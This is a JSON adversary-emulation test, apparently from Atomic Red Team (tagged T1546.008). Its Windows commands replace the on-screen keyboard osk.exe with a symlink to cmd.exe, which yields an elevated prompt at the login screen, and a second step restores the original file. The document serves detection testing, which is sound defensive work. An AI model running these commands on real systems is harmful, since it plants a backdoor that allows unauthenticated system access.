{
  "id": "51ef369c-5e87-4f33-88cd-6d61be63edf2",
  "name": "Create Symbolic Link From osk.exe to cmd.exe",
  "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "3e879514-2217-4f7e-92fc-2b6b4bc91e71",
      "type": "execute-command",
      "data": {
        "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "eaca6963-1a20-4168-8cf9-c8a61f702288",
      "type": "execute-command",
      "data": {
        "command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "3e879514-2217-4f7e-92fc-2b6b4bc91e71",
      "p": "on-success",
      "o": "eaca6963-1a20-4168-8cf9-c8a61f702288"
    },
    {
      "s": "3e879514-2217-4f7e-92fc-2b6b4bc91e71",
      "p": "on-failure",
      "o": "eaca6963-1a20-4168-8cf9-c8a61f702288"
    }
  ],
  "tags": [
    "T1546.008",
    "atomic-red-team"
  ]
}